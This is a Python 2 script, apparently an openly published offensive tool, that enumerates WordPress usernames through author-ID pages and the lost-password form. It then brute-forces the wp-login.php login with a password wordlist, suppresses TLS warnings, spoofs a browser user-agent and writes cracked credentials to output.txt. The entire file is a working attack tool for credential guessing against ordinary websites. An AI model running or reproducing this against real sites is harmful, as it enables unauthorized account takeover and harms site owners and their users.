#!/usr/bin/python
#coding: utf-8

import requests
from lxml.html import fromstring
from requests.exceptions import ConnectionError
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from progressbar import ProgressBar
pbar = ProgressBar()
import sys, os, argparse
reload(sys)
sys.setdefaultencoding('utf-8')

print ''' \033[1;33m
                █▀▀█ █░█  █░░░█    █▀▀█     █▀▀▄     █▀▀
                █▄▀█ ▄▀▄  █▄█▄█ord █░░█ress █▀▀▄RUTE █▀▀ORCER
                █▄▄█ ▀░▀  ░▀░▀░    █▀▀▀     ▀▀▀░     ▀░░ v1.2
                Coded By Abdullah AlZahrani | Site: www.0xa.tech
                Twitter: @0xAbdullah | GitHub.com/0xAbdullah\033[1;m\n'''

parser = argparse.ArgumentParser(description="Wordpress users enumerate and brute force attack")
parser.add_argument( '-s', required=True, default=None, help='target domain or URL.    [Example] python 0xwpbf.py -s http://example.com')
parser.add_argument( '-p', required=False, default=None , help='Path of the password file.    [Example] python 0xwpbf.py -s http://example.com -p password.txt')
parser.add_argument( '-u', required=False, default=None , help='target username.    [Example] python 0xwpbf.py -s http://example.com -u Admin -p password.txt')
parser.add_argument( '-e', required=False, default=None , help='Guess usernames.    [Example] python 0xwpbf.py -s http://example.com -e username.txt')
args = vars(parser.parse_args())

if len(sys.argv) == 1:
        print '[!] Usage: python WPBF.py -h'
        sys.exit(1)


UserName = args['u']
PasswordFile = args['p']
FileUsernames = args['e']
host = args['s']
if not host.startswith("http"):
    sys.exit("\033[1;33m[!]\033[1;m Wrong Site formate (ex): http://%s" % (host))

headers = { 'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0',
'Content-Type': 'application/x-www-form-urlencoded'}

def auto_users():
    if args['u'] is None:
        print "\033[1;33m[+]\033[1;m Searching for username..."
        ID = 1
        Found = 0
        CheckUser = (host+'/?author=')
        for i in CheckUser:
            try:
                TestUser = (CheckUser+str(ID))
                r = requests.get(TestUser, headers=headers)
                if r.status_code == 200:
                    pass
                else:
                    break
                r = requests.get(CheckUser+str(ID), headers=headers)
                tree = fromstring(r.content)
                user = tree.findtext('.//title')
                User, sep, tail = user.partition(' ')
                print "\033[1;32m[#]\033[1;m ID: %s Username: \033[1;32m%s\033[1;m" % (ID, User)
                Found = 1
                ID = ID+1
            except KeyboardInterrupt:
                break
            except:
                pass
        if Found == 0:
            print "\033[1;33m[!]\033[1;m User Not Found !"


def BF():
    if os.path.exists(args['p']) == False:
        print "[!] \033[1;33mFile Path Dose Not exist !\033[1;m"
        sys.exit()
    Password = open(PasswordFile, 'r').readlines()
    Target = (host+"/wp-login.php")
    print '''
[#] Website: %s
[#] Username: %s''' % (host, UserName)
    Found = 0
    for line in pbar(Password):
        password = line.strip()
        try:
            http = requests.post(Target, data={'log':UserName, 'pwd':password, 'wp-submit':'submit' }, verify=False, timeout=5, headers=headers)
            content = http.content
            if "Dashboard" in content:
                print "\n\n[+] Password Found!"
                print "[+] Dashboard: %s\n[+] Username: %s\n[+] Password: \033[1;42m%s\033[1;m \n[*] Check output.txt File !" % (Target, UserName, password)
                Foundpass = "[~] Target: %s\n[@] User: %s\n[$] Password: %s\n\n" % (Target, UserName, password)
                file = open("output.txt", "a")
                file.write(Foundpass)
                file.close()
                Found = 1
                break
            else:
                pass
        except ConnectionError:
            pass
	except Exception:
            pass
        except requests.exceptions.Timeout:
            pass
        except KeyboardInterrupt:
            print "\n\n\033[1;33m[!]\033[1;m User requested An Interrupt"
            sys.exit()
    if Found == 0:
        print "\n\033[1;33m[-]\033[1;m Password Not Found !"
    else:
        pass


def Guess_usernames():
    if os.path.exists(args['e']) == False:
        print "[!] \033[1;33mFile Path Dose Not exist !\033[1;m"
    UserName = open(FileUsernames, 'r').readlines()
    Target = (host+"/wp-login.php?action=lostpassword")
    print "\033[1;33m[+]\033[1;m Searching for username..."
    Checker = 'error-page'
    Found = 0
    for line in UserName:
        UserName = line.strip()
        try:
            http = requests.post(Target, data={'user_login':UserName, 'wp-submit':'submit' }, verify=False, timeout=5, headers=headers)
            content = http.content
            if "loginform" in content:
                print "\033[1;32m[#]\033[1;m Username: \033[1;32m%s\033[1;m" % UserName
                Found = 1
            elif " mail() " in content:
                print "\033[1;32m[#]\033[1;m Username: \033[1;32m%s\033[1;m" % UserName
                Found = 1
            else:
                pass
        except ConnectionError:
            pass
        except requests.exceptions.Timeout:
            pass
        except KeyboardInterrupt:
            print "\n\n\033[1;33m[!]\033[1;m User requested An Interrupt"
            sys.exit()
    if Found == 0:
        print "\033[1;33m[!]\033[1;m User Not Found !"
if args['s'] is not None and args['e'] is not None:
    Guess_usernames()
elif args['s'] is not None and args['u'] is None:
    auto_users()
elif args['s'] is not None and args['u'] is not None and args['p'] is not None:
    BF()
else:
    print "\033[1;33m[!]\033[1;m Input is not correct, check them out! Or typing python 0xwpbf.py -h"
